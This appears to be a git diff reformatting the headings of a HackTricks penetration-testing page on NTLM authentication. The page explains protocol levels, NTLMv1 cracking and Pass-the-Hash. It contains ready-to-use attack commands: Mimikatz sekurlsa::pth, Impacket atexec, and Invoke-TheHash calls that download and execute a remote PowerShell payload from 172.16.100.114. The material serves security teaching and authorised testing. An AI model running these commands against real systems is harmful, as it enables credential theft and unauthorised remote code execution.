@@ -17,9 +17,7 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 </details>
 
 
-# NTLM
-
-## Basic Information
+# Basic Information
 
 **NTLM Credentials**: Domain name (if any), username and password hash.
 
@@ -31,17 +29,17 @@ The **network packets** of a **NTLM authentication** have the **header** "**NTLM
 
 The protocols: LM, NTLMv1 and NTLMv2 are supported in the DLL %windir%\Windows\System32\msv1\_0.dll
 
-## LM, NTLMv1 and NTLMv2
+# LM, NTLMv1 and NTLMv2
 
 You can check and configure which protocol will be used:
 
-### GUI
+## GUI
 
 Execute _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. There are 6 levels (from 0 to 5).
 
 ![](<../../.gitbook/assets/image (92).png>)
 
-### Registry
+## Registry
 
 This will set the level 5:
 
@@ -60,7 +58,7 @@ Possible values:
 5 - Send NTLMv2 response only, refuse LM & NTLM
 ```
 
-## Basic NTLM Domain authentication Scheme
+# Basic NTLM Domain authentication Scheme
 
 1. The **user** introduces his **credentials**
 2. The client machine **sends an authentication request** sending the **domain name** and the **username**
@@ -71,11 +69,11 @@ Possible values:
 
 The **server** and the **Domain Controller** are able to create a **Secure Channel** via **Netlogon** server as the Domain Controller know the password of the server (it is inside the **NTDS.DIT** db).
 
-### Local NTLM authentication Scheme
+## Local NTLM authentication Scheme
 
 The authentication is as the one mentioned **before but** the **server** knows the **hash of the user** that tries to authenticate inside the **SAM** file. So, instead of asking the Domain Controller, the **server will check itself** if the user can authenticate.
 
-### NTLMv1 Challenge
+## NTLMv1 Challenge
 
 The **challenge length is 8 bytes** and the **response is 24 bytes** long.
 
@@ -89,7 +87,7 @@ The **hash NT (16bytes)** is divided in **3 parts of 7bytes each** (7B + 7B + (2
 * The 3º key is composed always by **5 zeros**.
 * Given the **same challenge** the **response** will be **same**. So, you can give as a **challenge** to the victim the string "**1122334455667788**" and attack the response used **precomputed rainbow tables**.
 
-### NTLMv1 attack
+## NTLMv1 attack
 
 Nowadays is becoming less common to find environments with Unconstrained Delegation configured, but this doesn't mean you can't **abuse a Print Spooler service** configured.
 
@@ -99,7 +97,7 @@ _Note that for this technique the authentication must be performed using NTLMv1 
 
 Remember that the printer will use the computer account during the authentication, and computer accounts use **long and random passwords** that you **probably won't be able to crack** using common **dictionaries**. But the **NTLMv1** authentication **uses DES** ([more info here](./#ntlmv1-challenge)), so using some services specially dedicated to cracking DES you will be able to crack it (you could use [https://crack.sh/](https://crack.sh) for example).
 
-### NTLMv2 Challenge
+## NTLMv2 Challenge
 
 The **challenge length is 8 bytes** and **2 responses are sent**: One is **24 bytes** long and the length of the **other** is **variable**.
 
@@ -109,14 +107,14 @@ The **second response** is created using **several values** (a new client challe
 
 If you have a **pcap that has captured a successful authentication process**, you can follow this guide to get the domain, username , challenge and response and try to creak the password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)
 
-## Pass-the-Hash
+# Pass-the-Hash
 
 **Once you have the hash of the victim**, you can use it to **impersonate** it.\
 You need to use a **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.
 
 **Please, remember that you can perform Pass-the-Hash attacks also using Computer accounts.**
 
-### **Mimikatz**
+## **Mimikatz**
 
 **Needs to be run as administrator**
 
@@ -126,12 +124,12 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm
 
 This will launch a process that will belongs to the users that have launch mimikatz but internally in LSASS the saved credentials are the ones inside the mimikatz parameters. Then, you can access to network resources as if you where that user (similar to the `runas /netonly` trick but you don't need to know the plain-text password).
 
-### Pass-the-Hash from linux
+## Pass-the-Hash from linux
 
 You can obtain code execution in Windows machines using Pass-the-Hash from Linux. \
 [**Access here to learn how to do it.**](broken-reference)
 
-### Impacket Windows compiled tools
+## Impacket Windows compiled tools
 
 You can download[ impacket binaries for Windows here](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).
 
@@ -140,35 +138,35 @@ You can download[ impacket binaries for Windows here](https://github.com/ropnop/
 * **atexec.exe** (In this case you need to specify a command, cmd.exe and powershell.exe are not valid to obtain an interactive shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
 * There are several more Impacket binaries...
 
-### Invoke-TheHash
+## Invoke-TheHash
 
 You can get the powershell scripts from here: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
 
-#### Invoke-SMBExec
+### Invoke-SMBExec
 
 ```
 Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
 ```
 
-#### Invoke-WMIExec
+### Invoke-WMIExec
 
 ```
 Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
 ```
 
-#### Invoke-SMBClient
+### Invoke-SMBClient
 
 ```
 Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
 ```
 
-#### Invoke-SMBEnum
+### Invoke-SMBEnum
 
 ```
 Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
 ```
 
-#### Invoke-TheHash
+### Invoke-TheHash
 
 This function is a **mix of all the others**. You can pass **several hosts**, **exclude** someones and **select** the **option** you want to use (_SMBExec, WMIExec, SMBClient, SMBEnum_). If you select **any** of **SMBExec** and **WMIExec** but you **don't** give any _**Command**_ parameter it will just **check** if you have **enough permissions**.
 
@@ -176,9 +174,9 @@ This function is a **mix of all the others**. You can pass **several hosts**, **
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
 ```
 
-### [Evil-WinRM Pass the Hash](../../pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)
+## [Evil-WinRM Pass the Hash](../../pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)
 
-### Windows Credentials Editor (WCE)
+## Windows Credentials Editor (WCE)
 
 **Needs to be run as administrator**
 
@@ -188,18 +186,18 @@ This tool will do the same thing as mimikatz (modify LSASS memory).
 wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 ```
 
-### Manual Windows remote execution with username and password
+## Manual Windows remote execution with username and password
 
 * [**PsExec**](psexec-and-winexec.md)
 * [**SmbExec**](smbexec.md)
 * [**WmicExec**](wmicexec.md)
 * [**AtExec**](atexec.md)
 
-## Extracting credentials from a Windows Host
+# Extracting credentials from a Windows Host
 
 **For more information about** [**how to obtain credentials from a Windows host you should read this page**](../stealing-credentials/)**.**
 
-## NTLM Relay and Responder
+# NTLM Relay and Responder
 
 **Read more detailed guide on how to perform those attacks here:**
 
@@ -207,7 +205,7 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 [spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
 {% endcontent-ref %}
 
-## Parse NTLM challenges from a network capture
+# Parse NTLM challenges from a network capture
 
 **You can use** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
 
